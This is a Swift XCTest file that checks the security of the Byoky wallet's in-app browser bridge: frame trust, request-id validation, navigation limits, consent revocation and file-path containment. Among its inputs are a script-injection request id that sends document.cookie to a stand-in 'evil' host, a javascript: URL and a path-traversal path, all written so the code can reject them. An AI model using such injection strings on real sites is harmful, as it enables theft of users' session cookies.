import JavaScriptCore
import XCTest
@testable import Byoky

/// In-wallet browser bridge: who may talk to it, what it accepts, and that
/// replies reach the page intact.
@MainActor
final class BridgeSecurityTests: XCTestCase {

    // MARK: - Frames

    func testOnlyTheAppsMainFrameIsTrusted() {
        let app = "https://chat.example.com"
        XCTAssertTrue(NativeBridgeHandler.isTrustedFrame(isMainFrame: true, scheme: "https", host: "chat.example.com", port: 0, appOrigin: app))
        XCTAssertTrue(NativeBridgeHandler.isTrustedFrame(isMainFrame: true, scheme: "https", host: "Chat.Example.com", port: 443, appOrigin: app))
        // Sandboxed iframes / srcdoc, other origins, other ports, plain http.
        XCTAssertFalse(NativeBridgeHandler.isTrustedFrame(isMainFrame: false, scheme: "https", host: "chat.example.com", port: 0, appOrigin: app))
        XCTAssertFalse(NativeBridgeHandler.isTrustedFrame(isMainFrame: true, scheme: "", host: "", port: 0, appOrigin: app))
        XCTAssertFalse(NativeBridgeHandler.isTrustedFrame(isMainFrame: true, scheme: "https", host: "evil.example.com", port: 0, appOrigin: app))
        XCTAssertFalse(NativeBridgeHandler.isTrustedFrame(isMainFrame: true, scheme: "https", host: "chat.example.com", port: 8443, appOrigin: app))
        XCTAssertFalse(NativeBridgeHandler.isTrustedFrame(isMainFrame: true, scheme: "http", host: "chat.example.com", port: 0, appOrigin: app))

        let withPort = "https://localhost:8443"
        XCTAssertTrue(NativeBridgeHandler.isTrustedFrame(isMainFrame: true, scheme: "https", host: "localhost", port: 8443, appOrigin: withPort))
        XCTAssertFalse(NativeBridgeHandler.isTrustedFrame(isMainFrame: true, scheme: "https", host: "localhost", port: 0, appOrigin: withPort))
    }

    func testRequestIdsAreRestrictedToTheSDKShape() {
        XCTAssertTrue(NativeBridgeHandler.isValidRequestId(UUID().uuidString.lowercased()))
        XCTAssertTrue(NativeBridgeHandler.isValidRequestId("relay_abc123"))
        XCTAssertFalse(NativeBridgeHandler.isValidRequestId(""))
        XCTAssertFalse(NativeBridgeHandler.isValidRequestId("x',fetch('//evil/?'+document.cookie),'"))
        XCTAssertFalse(NativeBridgeHandler.isValidRequestId("a b"))
        XCTAssertFalse(NativeBridgeHandler.isValidRequestId(String(repeating: "a", count: 129)))
    }

    // MARK: - Navigation

    func testNavigationIsLimitedToTheAppsOrigin() {
        let origin = "https://chat.example.com"
        func allows(_ string: String, main: Bool = true) -> Bool {
            AppWebView.allowsNavigation(to: URL(string: string)!, isMainFrame: main, allowedOrigin: origin)
        }
        XCTAssertTrue(allows("https://chat.example.com/c/1"))
        XCTAssertTrue(allows("https://chat.example.com:443/"))
        XCTAssertFalse(allows("http://chat.example.com/"))
        XCTAssertFalse(allows("https://chat.example.com:8443/"))
        XCTAssertFalse(allows("https://evil.example.com/"))
        // about:/blob: only inside subframes.
        XCTAssertFalse(allows("about:blank"))
        XCTAssertFalse(allows("blob:https://chat.example.com/uuid"))
        XCTAssertTrue(allows("about:srcdoc", main: false))
        XCTAssertTrue(allows("blob:https://chat.example.com/uuid", main: false))
        XCTAssertFalse(allows("https://evil.example.com/", main: false))
        XCTAssertFalse(allows("javascript:alert(1)", main: false))
    }

    // MARK: - Reply delivery

    /// Runs the real bridge script in JavaScriptCore: a reply with non-ASCII
    /// text, passed as a JSON string like NativeBridgeHandler does, reaches
    /// the page's MessagePort unchanged.
    func testBridgeDeliversUnicodeIntact() throws {
        let context = try XCTUnwrap(JSContext())
        var exception: String?
        context.exceptionHandler = { _, value in exception = value?.toString() }
        context.evaluateScript("""
        var window = this;
        var console = { error: function() {} };
        window.addEventListener = function(type, handler) { window.__handler = handler; };
        window.webkit = { messageHandlers: { byoky: { postMessage: function(m) { window.__forwarded = m; } } } };
        """)
        context.evaluateScript(AppWebView.bridgeJavaScript)
        context.evaluateScript("""
        window.__handler({
            source: window,
            data: { type: 'BYOKY_PROXY_REQUEST', requestId: 'req-1' },
            ports: [{ postMessage: function(m) { window.__received = m; } }]
        });
        """)
        XCTAssertNil(exception)
        XCTAssertEqual(context.evaluateScript("window.__forwarded.requestId")?.toString(), "req-1")

        let text = "héllo ключ 中文 👋🏽 \"quoted\" \\ back</script>"
        let json = try XCTUnwrap(NativeBridgeHandler.encodeMessage([
            "type": "BYOKY_PROXY_RESPONSE_CHUNK", "requestId": "req-1", "chunk": text,
        ]))
        let deliver = try XCTUnwrap(context.evaluateScript("window.__byokyBridge._deliver"))
        deliver.call(withArguments: ["req-1", json])
        XCTAssertNil(exception)
        XCTAssertEqual(context.evaluateScript("window.__received.chunk")?.toString(), text)
        XCTAssertEqual(context.evaluateScript("window.__received.type")?.toString(), "BYOKY_PROXY_RESPONSE_CHUNK")
    }

    // MARK: - Consent

    func testRevokedOriginStaysBlockedUntilGranted() throws {
        let suite = "byoky.tests.\(UUID().uuidString)"
        let defaults = try XCTUnwrap(UserDefaults(suiteName: suite))
        defer { defaults.removePersistentDomain(forName: suite) }
        let store = AppConsentStore(defaults: defaults)

        XCTAssertFalse(store.isRevoked("https://a.example"))
        store.revoke("https://a.example")
        XCTAssertTrue(store.isRevoked("https://a.example"))
        XCTAssertFalse(store.isRevoked("https://b.example"))
        // Survives a "relaunch" (a fresh store over the same defaults).
        XCTAssertTrue(AppConsentStore(defaults: defaults).isRevoked("https://a.example"))
        store.grant("https://a.example")
        XCTAssertFalse(store.isRevoked("https://a.example"))
    }

    func testOpeningAWalletRevokedAppNeedsReapproval() throws {
        let suite = "byoky.tests.\(UUID().uuidString)"
        let defaults = try XCTUnwrap(UserDefaults(suiteName: suite))
        defer { defaults.removePersistentDomain(forName: suite) }
        let store = AppConsentStore(defaults: defaults)

        // Never revoked: opens without asking.
        XCTAssertFalse(store.needsReapproval(appURL: "https://chat.example.com/app"))

        // Revoked in Connected Apps: every page of that origin asks first.
        store.revoke("https://chat.example.com")
        XCTAssertTrue(store.needsReapproval(appURL: "https://chat.example.com/app"))
        XCTAssertTrue(store.needsReapproval(appURL: "https://chat.example.com/other?x=1#y"))
        // Other origins, including another port on the same host, don't.
        XCTAssertFalse(store.needsReapproval(appURL: "https://chat.example.com:8443/app"))
        XCTAssertFalse(store.needsReapproval(appURL: "https://other.example.com/"))
        XCTAssertFalse(store.needsReapproval(appURL: "not a url"))

        store.revoke("https://h.example:8443")
        XCTAssertTrue(store.needsReapproval(appURL: "https://h.example:8443/x"))
        XCTAssertFalse(store.needsReapproval(appURL: "https://h.example/x"))

        // "Reconnect" lifts it, and it stays lifted across a relaunch.
        store.grant("https://chat.example.com")
        XCTAssertFalse(store.needsReapproval(appURL: "https://chat.example.com/app"))
        XCTAssertFalse(AppConsentStore(defaults: defaults).needsReapproval(appURL: "https://chat.example.com/app"))
    }

    /// An app that disconnected itself (BYOKY_DISCONNECT) ends its session
    /// but is not revoked, so it opens again without a prompt.
    @MainActor
    func testAppSideDisconnectDoesNotNeedReapproval() throws {
        let wallet = WalletStore.shared
        let app = try InstalledApp.make(from: "https://self-\(UUID().uuidString.prefix(8).lowercased()).example/app", name: nil)
        let origin = InstalledApp.origin(of: try XCTUnwrap(URL(string: app.url)))
        wallet.endSession(appOrigin: origin)
        XCTAssertFalse(wallet.isAppAccessRevoked(origin: origin))
        XCTAssertFalse(wallet.needsReapproval(app))
    }

    // MARK: - Shared hosting, incoming files

    func testSharedHostingOrigins() {
        for host in ["sites.google.com", "me.github.io", "app.vercel.app", "x.netlify.app", "y.pages.dev"] {
            XCTAssertTrue(InstalledApp.isSharedHosting(URL(string: "https://\(host)/app")!), host)
        }
        for host in ["chat.example.com", "github.com", "notvercel.app.example.com"] {
            XCTAssertFalse(InstalledApp.isSharedHosting(URL(string: "https://\(host)/")!), host)
        }
    }

    func testOnlyFilesInsideTheAppContainerAreCleanedUp() {
        let home = URL(fileURLWithPath: "/var/mobile/Containers/Data/Application/ABC")
        XCTAssertTrue(WalletStore.isInsideAppContainer(home.appendingPathComponent("Documents/Inbox/a.byoky"), home: home))
        XCTAssertTrue(WalletStore.isInsideAppContainer(home.appendingPathComponent("tmp/com.byoky.app-Inbox/a.byoky"), home: home))
        XCTAssertFalse(WalletStore.isInsideAppContainer(URL(fileURLWithPath: "/var/mobile/Containers/Data/Application/ABCD/x.byoky"), home: home))
        XCTAssertFalse(WalletStore.isInsideAppContainer(URL(fileURLWithPath: "/private/var/mobile/Library/Mobile Documents/x.byoky"), home: home))
        XCTAssertFalse(WalletStore.isInsideAppContainer(home.appendingPathComponent("../Other/x.byoky"), home: home))
        XCTAssertFalse(WalletStore.isInsideAppContainer(URL(string: "https://example.com/x.byoky")!, home: home))
    }

    // MARK: - Keychain

    func testKeychainSaveUpdatesInPlace() throws {
        let keychain = KeychainService.shared
        let key = "test_update_\(UUID().uuidString)"
        defer { try? keychain.delete(key: key) }
        try keychain.saveString(key: key, value: "first")
        try keychain.saveString(key: key, value: "second")
        XCTAssertEqual(try keychain.loadString(key: key), "second")
    }
}
